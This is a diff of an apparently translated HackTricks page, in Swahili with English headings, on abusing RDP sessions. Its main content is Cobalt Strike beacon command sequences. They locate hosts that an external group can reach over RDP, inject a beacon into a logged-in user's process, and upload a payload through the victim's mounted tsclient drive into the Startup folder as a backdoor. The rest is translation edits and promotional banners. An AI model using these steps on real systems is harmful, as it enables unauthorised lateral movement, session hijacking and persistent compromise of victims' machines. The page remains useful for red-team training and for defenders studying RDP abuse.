@@ -1,24 +1,25 @@
-# Matumizi Mabaya ya Kikao cha RDP
+# RDP Sessions Abuse
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Uingizaji wa Mchakato wa RDP
+## RDP Process Injection
 
-Ikiwa **kikundi cha nje** kina **upatikanaji wa RDP** kwa **kompyuta yoyote** katika kikoa cha sasa, **mshambuliaji anaweza kudukua kompyuta hiyo na kusubiri**.
+Ikiwa **kikundi cha nje** kina **ufikiaji wa RDP** kwa **kompyuta** yoyote katika eneo la sasa, **mshambuliaji** anaweza **kuharibu kompyuta hiyo na kumsubiri**.
 
-Marafiki huyo amepata upatikanaji kupitia RDP, **mshambuliaji anaweza kuingia kwenye kikao cha mtumiaji huyo** na kutumia vibali vyake katika kikoa cha nje.
+Mara tu mtumiaji huyo anapofikia kupitia RDP, **mshambuliaji anaweza kuhamasisha kwenye kikao cha watumiaji hao** na kutumia ruhusa zake katika eneo la nje.
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -42,13 +43,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Angalia **njia nyingine za kuiba vikao kwa kutumia zana nyingine** [**katika ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Check **njia nyingine za kuiba vikao kwa kutumia zana nyingine** [**katika ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Ikiwa mtumiaji anapata **kupitia RDP kwenye kifaa** ambapo **mshambuliaji** anamngojea, mshambuliaji ataweza **kuingiza ishara katika kikao cha RDP cha mtumiaji** na ikiwa **mwathirika amefunga diski yake** wakati anapata kupitia RDP, **mshambuliaji anaweza kuipata**.
+Ikiwa mtumiaji anapata **RDP kwenye mashine** ambapo **mshambuliaji** anangojea **yeye**, mshambuliaji ataweza **kuingiza beacon katika kikao cha RDP cha mtumiaji** na ikiwa **mhasiriwa ameunganisha diski yake** wakati wa kufikia kupitia RDP, **mshambuliaji anaweza kuipata**.
 
-Katika kesi hii, unaweza tu **kuathiri** **kompyuta halisi ya mwathirika** kwa kuandika **mlango wa nyuma** katika **folda ya kuanza**.
+Katika kesi hii unaweza tu **kudhoofisha** **kompyuta ya awali ya wahasiriwa** kwa kuandika **backdoor** katika **folda ya kuanzisha**.
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -80,16 +81,17 @@ dir     10/18/2016 01:59:39   Documents and Settings
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
